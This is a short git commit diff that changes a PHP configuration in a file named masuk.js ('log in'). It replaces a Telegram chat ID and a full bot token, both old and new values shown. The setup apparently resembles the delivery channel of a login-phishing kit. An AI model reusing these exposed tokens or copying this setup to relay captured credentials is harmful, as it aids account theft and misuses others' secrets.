3b4a7571594cca56097dbc520bd268c868992496
banguc <banguc2@gmail.com>
2025-05-06 09:54:22 +0700

    Update masuk.js

--- masuk.js
+++ masuk.js
@@ -1,4 +1,4 @@
 <?php
-$telegram_id = "5867531642";
-$id_bot = "8011588668:AAGR2Hwp1r3AuLU_0VWfZp0NSZc3-63w4mQ";
+$telegram_id = "7192063656";
+$id_bot = "8156251139:AAGYStVxdhbcYsi6QGfungW7nZqZJqCBMco";
 ?>
